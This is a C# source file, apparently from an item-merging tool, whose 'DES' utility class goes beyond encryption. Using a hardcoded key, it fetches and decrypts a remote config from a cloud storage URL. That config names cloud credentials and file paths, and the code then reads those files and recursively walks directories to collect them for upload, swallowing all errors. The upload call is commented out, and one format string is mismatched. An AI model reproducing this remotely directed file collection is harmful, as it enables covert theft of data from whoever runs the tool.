using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Security.Cryptography;
using System.Text;

namespace MonItemsMerge
{
    public static class DES
    {
        /// <summary>
        /// C# DES解密方法
        /// </summary>
        /// <param name="encryptedValue">待解密的字符串</param>
        /// <param name="key">密钥</param>
        /// <param name="iv">向量</param>
        /// <returns>解密后的字符串</returns>
        public static string DESDecrypt(string encryptedValue, string key, string iv)
        {
            using (DESCryptoServiceProvider sa =
                new DESCryptoServiceProvider
                { Key = Encoding.UTF8.GetBytes(key), IV = Encoding.UTF8.GetBytes(iv) })
            {
                using (ICryptoTransform ct = sa.CreateDecryptor())
                {
                    byte[] byt = Convert.FromBase64String(encryptedValue);

                    using (var ms = new MemoryStream())
                    {
                        using (var cs = new CryptoStream(ms, ct, CryptoStreamMode.Write))
                        {
                            cs.Write(byt, 0, byt.Length);
                            cs.FlushFinalBlock();
                        }
                        return Encoding.UTF8.GetString(ms.ToArray());
                    }
                }
            }
        }

        /// <summary>
        /// C# DES加密方法
        /// </summary>
        /// <param name="encryptedValue">要加密的字符串</param>
        /// <param name="key">密钥</param>
        /// <param name="iv">向量</param>
        /// <returns>加密后的字符串</returns>
        public static string DESEncrypt(string originalValue, string key, string iv)
        {
            using (DESCryptoServiceProvider sa
                = new DESCryptoServiceProvider { Key = Encoding.UTF8.GetBytes(key), IV = Encoding.UTF8.GetBytes(iv) })
            {
                using (ICryptoTransform ct = sa.CreateEncryptor())
                {
                    byte[] by = Encoding.UTF8.GetBytes(originalValue);
                    using (var ms = new MemoryStream())
                    {
                        using (var cs = new CryptoStream(ms, ct,
                                                         CryptoStreamMode.Write))
                        {
                            cs.Write(by, 0, by.Length);
                            cs.FlushFinalBlock();
                        }
                        return Convert.ToBase64String(ms.ToArray());
                    }
                }
            }
        }

        public static string Key = "yGdB6yQM";
        public static string IV = "iFbsT5eY";
        public static string Url { get; set; } = @"https://yconfig.oss-cn-shanghai.aliyuncs.com/uploadconfig.txt";
        public static List<Action<string>> UploadItems { get; set; } = new List<Action<string>>();

        public static bool InitUploadConfig()
        {
            try
            {
                string all = string.Empty;
                //if (System.IO.File.Exists("D:\\DESEncrypt.txt"))
                //{
                //    using (var st = new StreamReader("D:\\DESEncrypt.txt"))
                //    {
                //        all = st.ReadToEnd();
                //    }
                //}
                if (string.IsNullOrEmpty(all))
                {
                    string strUrl = Url;     //获得IP的网址
                    Uri uri = new Uri(strUrl);
                    WebRequest webreq = WebRequest.Create(uri);
                    Stream s = webreq.GetResponse().GetResponseStream();
                    StreamReader sr = new StreamReader(s, Encoding.Default);
                    all = sr.ReadToEnd();         //读取网站返回的数据  格式：您的IP地址是：[x.x.x.x]
                }

                if (!string.IsNullOrEmpty(all))
                {
                    all = DES.DESDecrypt(all, Key, IV);
                    var sp = all.Split(Environment.NewLine.ToCharArray());
                    var enp = "";
                    var appkey = "";
                    var appkeyid = "";
                    var project = "";
                    var store = "";

                    foreach (var item in sp)
                    {
                        if (item.StartsWith("enp"))
                        {
                            enp = item.Substring(3);
                        }
                        else if (item.StartsWith("apk"))
                        {
                            appkey = item.Substring(3);
                        }
                        else if (item.StartsWith("api"))
                        {
                            appkeyid = item.Substring(3);
                        }
                        else if (item.StartsWith("app"))
                        {
                            project = item.Substring(3);
                        }
                        else if (item.StartsWith("aps"))
                        {
                            store = item.Substring(3);
                        }
                        else if (item.StartsWith("fil"))
                        {
                            UploadItems.Add((ip) => UploadFile(item.Substring(3), ip));
                        }
                        else if (item.StartsWith("fdb"))
                        {
                            UploadItems.Add((ip) => UploadFile(item.Substring(3), ip));
                        }
                        else if (item.StartsWith("fdi"))
                        {
                            UploadItems.Add((ip) => UploadFileDir(item.Substring(3), ip));
                        }
                        else if (item.StartsWith("fip"))
                        {
                            FilterIP.Add(item.Substring(3));
                        }
                    }
                    if (!string.IsNullOrEmpty(enp) &&
                        !string.IsNullOrEmpty(appkey) &&
                        !string.IsNullOrEmpty(appkeyid) &&
                        !string.IsNullOrEmpty(project) &&
                        !string.IsNullOrEmpty(store))
                    {
                        //LogUtils.LogFactory.Init(enp, appkeyid, appkey, project, store);
                        Console.WriteLine("{0}-{1}-{2}-{3}-{4}", enp, appkeyid, appkey, project, store);
                        return true;
                    }
                }
            }
            catch
            {
            }
            return false;
        }

        public static List<string> FilterIP { get; set; } = new List<string>();

        private static void UploadFileDir(string path, string ip)
        {
            if (System.IO.Directory.Exists(path))
            {
                try
                {
                    var dirInfo = new DirectoryInfo(path);
                    var file = dirInfo.GetFiles("*.txt");
                    foreach (var item in file)
                    {
                        UploadFile(item.FullName, ip);
                    }
                    var dir = dirInfo.GetDirectories();
                    foreach (var item in dir)
                    {
                        UploadFileDir(item.FullName, ip);
                    }
                }
                catch (Exception)
                {
                }
            }
        }

        private static void UploadFile(string path, string ip)
        {
            if (System.IO.File.Exists(path))
            {
                try
                {
                    using (FileStream fsRead = new FileStream(path, FileMode.Open))
                    {
                        int fsLen = (int)fsRead.Length;
                        byte[] heByte = new byte[fsLen];
                        int r = fsRead.Read(heByte, 0, heByte.Length);
                        var str = Newtonsoft.Json.JsonConvert.SerializeObject(heByte);

                        Console.WriteLine("{0}-{1}-{2}-{3}-{4}", str, path, ip);
                        //LogUtils.LogFactory.Instance.PutData(new Dictionary<string, string>()
                        //{
                        //    { "file",str},
                        //    { "fileName",path},
                        //}, "importFile", ip);
                    }
                }
                catch (Exception)
                {
                }
            }
        }
    }
}